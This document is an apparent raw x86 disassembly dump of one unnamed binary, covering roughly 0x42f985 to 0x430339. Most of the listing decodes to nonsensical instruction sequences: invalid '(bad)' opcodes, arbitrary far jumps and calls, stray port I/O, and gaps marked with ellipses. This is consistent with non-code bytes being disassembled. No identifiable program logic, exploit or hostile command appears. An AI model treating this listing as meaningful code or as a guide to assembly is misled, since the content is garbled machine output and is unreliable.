  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0x9c000001,al
  42f98d:	adc    eax,0x76eb672f
  42f992:	std    
  42f993:	enter  0xb3d6,0x1a
  42f997:	mov    eax,0xc895078
  42f99c:	and    bh,BYTE PTR [eax+edi*1+0x6be0e353]
  42f9a3:	retf   
  42f9a4:	test   BYTE PTR [edx-0x14],bh
  42f9a7:	jmp    0x7a79:0xe1665510
  42f9ae:	cmp    bh,BYTE PTR [ebx-0x1bea9f09]
  42f9b4:	(bad)  
  42f9b5:	repz data16 mov ch,0x7a
  42f9b9:	mov    fs,eax
  42f9bb:	inc    eax
  42f9bc:	test   eax,0x1e7d7dde
  42f9c1:	and    dl,BYTE PTR [esi-0x729ea541]
  42f9c7:	or     BYTE PTR [edi+esi*4],ch
  42f9ca:	mov    esp,0x64c3cfc9
  42f9cf:	cli    
  42f9d0:	sbb    al,0x84
  42f9d2:	ds jae 0x42fa23
  42f9d5:	inc    dx
  42f9d7:	inc    ebx
  42f9d8:	xor    al,0x13
  42f9da:	fdiv   st(1),st
  42f9dc:	xor    ebx,esp
  42f9de:	ret    0x7da6
  42f9e1:	push   0xffffff9c
  42f9e3:	lds    edx,FWORD PTR [eax]
  42f9e5:	pop    eax
  42f9e6:	out    0x21,eax
  42f9e8:	lock and al,0x7d
  42f9eb:	and    edi,ecx
  42f9ed:	xor    al,0x83
  42f9ef:	mov    ebp,0x73ebff9a
  42f9f4:	mov    ah,0x4
  42f9f6:	sub    eax,0xefa53446
  42f9fb:	pushf  
  42f9fc:	or     BYTE PTR [ebp+0x18],al
  42f9ff:	jnp    0x42fa36
  42fa01:	les    eax,FWORD PTR [ecx+0x3771f8b]
  42fa07:	push   ebx
  42fa08:	or     eax,0xba507c0c
  42fa0d:	fmul   st(7),st
  42fa0f:	enter  0xdb31,0x24
  42fa13:	push   esi
  42fa14:	sub    ebp,esp
  42fa16:	cs stos BYTE PTR es:[edi],al
  42fa18:	or     BYTE PTR [edi-0x25fbf7d8],ch
  42fa1e:	test   DWORD PTR [edi],ebx
  42fa20:	(bad)  
  42fa21:	les    esi,FWORD PTR [edx+0x15]
  42fa24:	iret   
  42fa25:	cli    
  42fa26:	fdiv   QWORD PTR [esi]
  42fa28:	cmp    eax,0xaaaa5a9a
  42fa2d:	(bad)  
  42fa2e:	in     al,0x6a
  42fa30:	fdivr  DWORD PTR [edx-0x18]
  42fa33:	xor    al,BYTE PTR [ebx+0x192f5ccb]
  42fa39:	out    0x95,al
  42fa3b:	jge    0x42fa04
  42fa3d:	mov    bh,0xa8
  42fa3f:	fisubr WORD PTR [edi-0x61]
  42fa42:	jl     0x42fa5d
  42fa44:	jp     0x42fa24
  42fa46:	faddp  st(7),st
  42fa48:	xor    DWORD PTR [ebp-0x2d3dced9],ebx
  42fa4e:	neg    BYTE PTR [edx+esi*8+0x67f91e14]
  42fa55:	or     bh,dl
  42fa57:	jns    0x42fa8c
  42fa59:	adc    ebx,esp
  42fa5b:	xchg   DWORD PTR [esi-0x49426f09],esp
  42fa61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa62:	xor    ch,BYTE PTR [esi+0x3e]
  42fa65:	jl     0x42fa9e
  42fa67:	pop    esi
  42fa68:	loop   0x42faae
  42fa6a:	in     eax,0x1
  42fa6c:	cmp    esp,DWORD PTR [eax+0x303342ba]
  42fa72:	mov    ds:0x1ae18b78,eax
  42fa77:	sahf   
  42fa78:	mov    eax,ds:0x9d16c330
  42fa7d:	pop    edi
  42fa7e:	xchg   dl,dh
  42fa80:	cli    
  42fa81:	jno    0x42fa19
  42fa83:	ins    DWORD PTR es:[edi],dx
  42fa84:	inc    eax
  42fa85:	nop
  42fa86:	test   al,0x11
  42fa88:	int3   
  42fa89:	push   ebx
  42fa8a:	adc    ebp,DWORD PTR [eax+ecx*8]
  42fa8d:	push   edx
  42fa8e:	outs   dx,DWORD PTR ds:[esi]
  42fa8f:	scas   eax,DWORD PTR es:[edi]
  42fa90:	call   0x0:0x0
	...
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	sub    esp,DWORD PTR [ebp-0x3e]
  42fb03:	pop    ecx
  42fb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0x2000001,al
  42fb0d:	sub    edx,DWORD PTR [eax]
  42fb0f:	jne    0x42fb79
  42fb11:	pop    ss
  42fb12:	lods   eax,DWORD PTR ds:[esi]
  42fb13:	fsubr  QWORD PTR [esp+edi*1-0x71]
  42fb17:	out    dx,al
  42fb18:	jecxz  0x42fb40
  42fb1a:	jecxz  0x42fb43
  42fb1c:	ror    DWORD PTR [ecx+0x62],1
  42fb1f:	aad    0xe2
  42fb21:	loope  0x42faa4
  42fb23:	sbb    edx,DWORD PTR [eax]
  42fb25:	mov    ch,0x3a
  42fb27:	jns    0x42faf1
  42fb29:	lock jmp 0x42fb16
  42fb2c:	mov    ah,BYTE PTR [ebp+0x7b335015]
  42fb32:	jno    0x42fb1d
  42fb34:	ror    DWORD PTR [edx],0xac
  42fb37:	xchg   ebx,eax
  42fb38:	add    al,0xfd
  42fb3a:	loopne 0x42fb1d
  42fb3c:	xor    al,0x82
  42fb3e:	xlat   BYTE PTR ds:[ebx]
  42fb3f:	mul    BYTE PTR ds:0x670f3105
  42fb45:	mov    ecx,0x114dd09f
  42fb4a:	jns    0x42fb45
  42fb4c:	push   esi
  42fb4d:	(bad)  
  42fb4e:	pop    edi
  42fb4f:	mov    ebx,0xf2bf0666
  42fb54:	sbb    al,0x94
  42fb56:	or     BYTE PTR [ecx],cl
  42fb58:	or     BYTE PTR cs:[edi+0x69],cl
  42fb5c:	pop    esp
  42fb5d:	xchg   edi,eax
  42fb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb5f:	add    BYTE PTR [esp+edx*8-0x78],ch
  42fb63:	xchg   edi,eax
  42fb64:	or     DWORD PTR [ecx+0xea52e2e],ebp
  42fb6a:	jle    0x42fb65
  42fb6c:	inc    esi
  42fb6d:	stos   DWORD PTR es:[edi],eax
  42fb6e:	mov    bl,0x64
  42fb70:	jg     0x42fb00
  42fb72:	loope  0x42fb5a
  42fb74:	loope  0x42fb94
  42fb76:	bound  ebx,QWORD PTR gs:[ebx-0x9b853bc]
  42fb7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb7e:	mov    ebx,0xf27d88f6
  42fb83:	int3   
  42fb84:	outs   dx,DWORD PTR ds:[esi]
  42fb85:	cmp    al,0x63
  42fb87:	test   al,0x18
  42fb89:	jecxz  0x42fb66
  42fb8b:	inc    ebx
  42fb8c:	(bad)
  42fb8f:	xchg   ebx,eax
  42fb90:	jae    0x42fb39
  42fb92:	cmp    DWORD PTR [edx-0x7181e42e],eax
  42fb98:	add    ebp,ebp
  42fb9a:	leave  
  42fb9b:	call   0xca4b28a
  42fba0:	jge    0x42fbf7
  42fba2:	sar    WORD PTR ss:[ebp-0x80],cl
  42fba7:	stos   BYTE PTR es:[edi],al
  42fba8:	cmp    al,0xa8
  42fbaa:	mov    edx,0x2b99ed1
  42fbaf:	pop    es
  42fbb0:	fidivr DWORD PTR [ebp+0x5f]
  42fbb3:	into   
  42fbb4:	ficom  DWORD PTR [edx]
  42fbb6:	push   ss
  42fbb7:	dec    esi
  42fbb8:	push   ebx
  42fbb9:	add    bh,BYTE PTR [ebp+0x19306708]
  42fbbf:	mov    edi,0xebc981b6
  42fbc4:	ds mov dl,0x2e
  42fbc7:	bound  ecx,QWORD PTR cs:[bx+di-0x406a]
  42fbcd:	jmp    0x42fb63
  42fbcf:	mov    ecx,DWORD PTR [edi-0x383a39c2]
  42fbd5:	ret    0x182d
  42fbd8:	jl     0x42fbf5
  42fbda:	jmp    0x42fc56
  42fbdc:	into   
  42fbdd:	in     eax,0x8d
  42fbdf:	push   esi
  42fbe0:	sub    DWORD PTR [ebp-0xe],edx
  42fbe3:	call   0x4463:0xcf0b1732
  42fbea:	push   es
  42fbeb:	inc    ecx
  42fbec:	fcomp  st(7)
  42fbee:	cmp    DWORD PTR [ecx-0x39],edi
  42fbf1:	add    eax,0x76937634
  42fbf6:	int    0xa7
  42fbf8:	mov    fs,WORD PTR [ecx+0x8]
  42fbfb:	in     eax,0x2e
  42fbfd:	sub    eax,0xc1610dc7
  42fc02:	cli    
  42fc03:	xor    ah,BYTE PTR [edi+eax*2]
  42fc06:	outs   dx,BYTE PTR ds:[esi]
  42fc07:	jnp    0x42fc07
  42fc09:	in     eax,dx
  42fc0a:	and    al,bl
  42fc0c:	lds    ecx,FWORD PTR [edi+0x78097c]
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [ebp-0x5660340e],al
  42fc85:	add    BYTE PTR [edx],al
  42fc87:	add    BYTE PTR ds:0x4d000001,al
  42fc8d:	fisubr DWORD PTR [edi]
  42fc8f:	out    dx,eax
  42fc90:	ds popa 
  42fc92:	ja     0x42fccb
  42fc94:	test   al,0x2d
  42fc96:	dec    edx
  42fc97:	mov    esi,0xb1f293a6
  42fc9c:	xor    dl,BYTE PTR [ebp+0x50a475c9]
  42fca2:	mov    gs,eax
  42fca4:	push   cs
  42fca5:	push   ebp
  42fca6:	stc    
  42fca7:	out    0xd0,eax
  42fca9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcab:	dec    esi
  42fcac:	call   0x340be60a
  42fcb1:	push   eax
  42fcb2:	lahf   
  42fcb3:	pop    ebp
  42fcb4:	jle    0x42fd2c
  42fcb6:	ds iret 
  42fcb8:	or     dl,bh
  42fcba:	inc    ebx
  42fcbb:	adc    BYTE PTR [ebp-0x5e931892],0xbf
  42fcc2:	mov    ah,0x72
  42fcc4:	mov    edx,0x735df6d6
  42fcc9:	call   0x4bc08b94
  42fcce:	aad    0x6f
  42fcd0:	in     eax,dx
  42fcd1:	lea    ebx,[eax-0xf]
  42fcd4:	imul   edx,esp,0xe6c8119e
  42fcda:	mov    ebp,eax
  42fcdc:	sub    BYTE PTR [ecx],0x50
  42fcdf:	jle    0x42fce3
  42fce1:	jo     0x42fc7f
  42fce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fce4:	bound  edi,QWORD PTR ds:0x454d676e
  42fcea:	into   
  42fceb:	ror    BYTE PTR [eax+ecx*2+0x69a08340],cl
  42fcf2:	test   DWORD PTR [esi+0x204342c7],esi
  42fcf8:	mov    esi,0x1965d95d
  42fcfd:	cmp    ah,dh
  42fcff:	mov    ecx,eax
  42fd01:	jne    0x42fd22
  42fd03:	and    dh,ch
  42fd05:	sub    DWORD PTR [esi+0x3b1d6a36],edx
  42fd0b:	jno    0x42fcb0
  42fd0d:	xor    ecx,DWORD PTR [esi-0x5]
  42fd10:	out    0x86,al
  42fd12:	adc    DWORD PTR [esi+0x43a72745],edx
  42fd18:	jecxz  0x42fd20
  42fd1a:	loop   0x42fd01
  42fd1c:	sub    eax,0x8c7111e8
  42fd21:	test   eax,0xbce9d28d
  42fd27:	sub    DWORD PTR [esi+0x732e9a5a],esp
  42fd2d:	push   ds
  42fd2e:	jle    0x42fd70
  42fd30:	fucomp st(7)
  42fd32:	sub    DWORD PTR [edi+0x4a],ecx
  42fd35:	fld    st(5)
  42fd37:	shl    DWORD PTR [edi-0x44e3ed87],0xc
  42fd3e:	(bad)  
  42fd3f:	into   
  42fd40:	sub    ah,al
  42fd42:	imul   ebp,DWORD PTR [esp+eiz*2+0x6a4f71a],0xffffff96
  42fd4a:	lods   al,BYTE PTR ds:[esi]
  42fd4b:	mov    al,0x68
  42fd4d:	hlt    
  42fd4e:	ss jmp 0x9306624b
  42fd54:	fwait
  42fd55:	lock stos BYTE PTR es:[edi],al
  42fd57:	lods   al,BYTE PTR ds:[esi]
  42fd58:	inc    edx
  42fd59:	scas   al,BYTE PTR es:[edi]
  42fd5a:	pop    esi
  42fd5b:	inc    ecx
  42fd5c:	scas   al,BYTE PTR es:[edi]
  42fd5d:	sub    al,0xee
  42fd5f:	test   BYTE PTR [edi+0x142d06b8],0x49
  42fd66:	push   esi
  42fd67:	nop
  42fd68:	and    dh,BYTE PTR [ecx-0x72c6c43b]
  42fd6e:	shl    eax,cl
  42fd70:	mov    esp,0x14531e1f
  42fd75:	outs   dx,DWORD PTR ss:[esi]
  42fd77:	jmp    0x127d:0x966436f0
  42fd7e:	cli    
  42fd7f:	sub    edx,ebx
  42fd81:	in     eax,0xca
  42fd83:	cld    
  42fd84:	pusha  
  42fd85:	cwde   
  42fd86:	sbb    DWORD PTR fs:[eax-0x55],eax
  42fd8a:	cmp    edx,eax
  42fd8c:	mov    ah,0x60
  42fd8e:	add    eax,0xc3ca
	...
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz dec edi
  42fe01:	ins    DWORD PTR es:[edi],dx
  42fe02:	jge    0x42fdc4
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0xb2000001,al
  42fe0d:	hlt    
  42fe0e:	jmp    0x42fe7c
  42fe10:	xchg   esi,eax
  42fe11:	push   edx
  42fe12:	jmp    FWORD PTR [esi+0x35]
  42fe15:	ss inc esp
  42fe17:	stc    
  42fe18:	mov    al,ds:0x167867dc
  42fe1d:	push   ebp
  42fe1e:	jl     0x42fe2e
  42fe20:	jle    0x42fe14
  42fe22:	mov    bl,BYTE PTR [eax]
  42fe24:	add    eax,0xb55ce1e9
  42fe29:	adc    eax,0x1895095
  42fe2e:	daa    
  42fe2f:	push   0x3f066ed
  42fe34:	push   0x2c893169
  42fe39:	imul   esi,DWORD PTR [esi-0x7e],0xbf7cfb17
  42fe40:	lock loop 0x42fe42
  42fe43:	push   ds
  42fe44:	sub    edx,esp
  42fe46:	push   es
  42fe47:	scas   al,BYTE PTR es:[edi]
  42fe48:	sub    eax,0xbe3f652d
  42fe4d:	fstp   QWORD PTR [ebx+0x8fc798d]
  42fe53:	mov    ah,0x4e
  42fe55:	push   ds
  42fe56:	jns    0x42fecb
  42fe58:	mov    esp,0x6665cab2
  42fe5d:	xor    DWORD PTR [edi+edx*2+0x33c062da],edi
  42fe64:	inc    eax
  42fe65:	retf   0xf389
  42fe68:	inc    esi
  42fe69:	repz clc 
  42fe6b:	dec    ebx
  42fe6c:	fcos   
  42fe6e:	pop    ebx
  42fe6f:	add    ecx,ebp
  42fe71:	cwde   
  42fe72:	sbb    eax,0xc59fd73f
  42fe77:	pusha  
  42fe78:	popa   
  42fe79:	mov    ebp,0xd05b62fe
  42fe7e:	mov    esi,ebx
  42fe80:	js     0x42fed6
  42fe82:	pop    ss
  42fe83:	fidiv  DWORD PTR [ecx]
  42fe85:	dec    ebp
  42fe86:	mov    ds:0x9f58d43f,eax
  42fe8b:	fwait
  42fe8c:	lods   al,BYTE PTR ds:[esi]
  42fe8d:	dec    ebx
  42fe8e:	mov    eax,ds:0x55026207
  42fe93:	shl    BYTE PTR [ebp-0x32d4723],cl
  42fe99:	pop    es
  42fe9a:	cmp    BYTE PTR [ebx+eiz*2-0x3d],bh
  42fe9e:	div    DWORD PTR ds:0xd69b42a
  42fea4:	add    dl,BYTE PTR [ebx]
  42fea6:	std    
  42fea7:	lahf   
  42fea8:	jae    0x42ff07
  42feaa:	test   ecx,ebp
  42feac:	outs   dx,DWORD PTR ds:[esi]
  42fead:	jae    0x42fe68
  42feaf:	mov    dh,0xff
  42feb1:	enter  0x222f,0x30
  42feb5:	push   cs
  42feb6:	dec    ecx
  42feb7:	rcl    ah,1
  42feb9:	rcr    BYTE PTR [eax+0x3a62b2c6],0xe1
  42fec0:	mov    bl,0xf5
  42fec2:	imul   edx,ecx,0xc30964c9
  42fec8:	xor    edi,edx
  42feca:	mov    dh,0x8e
  42fecc:	xor    BYTE PTR [edx+edx*2],bh
  42fecf:	jge    0x42ff44
  42fed1:	hlt    
  42fed2:	je     0x42fe91
  42fed4:	cmp    BYTE PTR [esi],ch
  42fed6:	popf   
  42fed7:	rol    DWORD PTR [eax+esi*2],cl
  42feda:	and    BYTE PTR [ecx],dh
  42fedc:	pop    ebx
  42fedd:	into   
  42fede:	cmp    eax,0x6682ff44
  42fee3:	imul   ecx,eax,0x22d891a4
  42fee9:	push   cs
  42feea:	xchg   ebp,eax
  42feeb:	jno    0x42fe92
  42feed:	jmp    0x42fee4
  42feef:	and    al,0x75
  42fef1:	dec    esp
  42fef2:	out    0x32,al
  42fef4:	inc    ebp
  42fef5:	push   edx
  42fef6:	xchg   ebx,eax
  42fef7:	push   esp
  42fef8:	es mov ecx,0x89075bab
  42fefe:	je     0x42ff1f
  42ff00:	les    edi,FWORD PTR [esi-0x67c43ce6]
  42ff06:	push   esp
  42ff07:	jecxz  0x42ff26
  42ff09:	sub    BYTE PTR [ebx],ch
  42ff0b:	mov    ah,bl
  42ff0d:	aaa    
  42ff0e:	inc    edx
  42ff0f:	ja     0x42fec3
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [eax+edx*2+0x24],0xa1
  42ff83:	lea    esi,[ebx+0x7f000202]
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    BYTE PTR [esi],dh
  42ff8d:	xor    al,0xbc
  42ff8f:	std    
  42ff90:	jae    0x42ffcc
  42ff92:	call   0xb16e:0xdd890845
  42ff99:	cmp    DWORD PTR es:[ebx+0x7f1ee0b4],esp
  42ffa0:	adc    DWORD PTR [edx],ebp
  42ffa2:	retf   0xb107
  42ffa5:	jne    0x430005
  42ffa7:	call   0xbf9c:0xd05ec63f
  42ffae:	nop
  42ffaf:	ror    BYTE PTR [edi+0x6f],0x96
  42ffb3:	or     esi,DWORD PTR [esi-0x19]
  42ffb6:	test   al,0x44
  42ffb8:	or     bl,BYTE PTR [eax]
  42ffba:	loope  0x42ffdb
  42ffbc:	sbb    cl,bh
  42ffbe:	popf   
  42ffbf:	xchg   BYTE PTR [ebp-0x307db69],al
  42ffc5:	dec    edx
  42ffc6:	mov    DWORD PTR [ebp-0x5c46f423],edx
  42ffcc:	retfw  0x23d3
  42ffd0:	mov    dl,0x6c
  42ffd2:	add    ecx,DWORD PTR [edi+0x2c7360ca]
  42ffd8:	outs   dx,DWORD PTR ds:[esi]
  42ffd9:	lods   eax,DWORD PTR ds:[esi]
  42ffda:	mov    DWORD PTR [edx-0x4d0236f1],eax
  42ffe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffe1:	call   0x12a4:0xd9e5b88d
  42ffe8:	dec    ebx
  42ffe9:	adc    al,0x25
  42ffeb:	fnstcw WORD PTR [ebp+0x2e997e48]
  42fff1:	sub    BYTE PTR ds:0xdfbeb70e,0x32
  42fff8:	sar    ecx,0xf3
  42fffb:	fiadd  WORD PTR [bp+si-0x23]
  42ffff:	fcmovnu st,st(6)
  430001:	fcom   QWORD PTR [ecx-0x2bd2c077]
  430007:	fs (bad) 
  430009:	out    0x11,al
	...
  430073:	add    BYTE PTR [ebp+0x55],cl
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
